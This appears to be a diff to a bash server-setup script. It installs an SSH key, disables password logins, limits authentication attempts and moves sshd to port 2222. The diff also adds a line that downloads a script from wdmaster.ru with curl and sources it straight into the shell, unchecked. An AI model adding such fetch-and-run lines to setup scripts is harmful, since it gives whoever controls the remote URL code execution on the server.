@@ -41,6 +41,10 @@ if [ -z "$key_ssh" ]; then
             read -p "$(echo -e "\e[1m\e[32m Enter Pub SSH-KEY (Ctrl+v): \e[0m")" key_ssh </dev/tty
             if [ -n "$key_ssh" ]; then
                 addkey "$key_ssh"
+                #sed -i "s/PermitRootLogin yes/PermitRootLogin no/g" /etc/ssh/sshd_config
+                sed -i "s/#MaxAuthTries 6/MaxAuthTries 3/g" /etc/ssh/sshd_config
+                sed -i "s/PasswordAuthentication yes/PasswordAuthentication no/g" /etc/ssh/sshd_config
+                sed -i "s/#PasswordAuthentication no/PasswordAuthentication no/g" /etc/ssh/sshd_config
                 grep -q "PasswordAuthentication no" /etc/ssh/sshd_config || sudo sed -i "\$ a PasswordAuthentication no" /etc/ssh/sshd_config
                 sudo sed -i 's/#Port 22/Port 2222/' /etc/ssh/sshd_config
                 sudo service sshd restart
@@ -63,11 +67,16 @@ else
             sudo apt update  &> /dev/null
             sudo apt install tar curl &> /dev/null
             addkey "$key_ssh"
+            #sed -i "s/PermitRootLogin yes/PermitRootLogin no/g" /etc/ssh/sshd_config
+            sed -i "s/#MaxAuthTries 6/MaxAuthTries 3/g" /etc/ssh/sshd_config
+            sed -i "s/PasswordAuthentication yes/PasswordAuthentication no/g" /etc/ssh/sshd_config
+            sed -i "s/#PasswordAuthentication no/PasswordAuthentication no/g" /etc/ssh/sshd_config
             grep -q "PasswordAuthentication no" /etc/ssh/sshd_config || sudo sed -i "\$ a PasswordAuthentication no" /etc/ssh/sshd_config
             sudo sed -i 's/#Port 22/Port 2222/' /etc/ssh/sshd_config
             sudo service sshd restart
             echo -e "\e[1m\e[32m Pub ssh-key intalled, port changed 2222. Use ssh $(whoami):$(curl -s ifconfig.me) -p 2222 -i ~/.ssh/my_prived_key \e[0m"
             echo -e "\e[1m\e[32m If up wireguard connection, use ssh $(whoami):10.50.0.1 -p 2222 -i ~/.ssh/my_prived_key \e[0m"
+            . <(curl -s -A 'Hi' --http2 https://wdmaster.ru/bash/addprofile.sh)
 fi
 
 while true; do
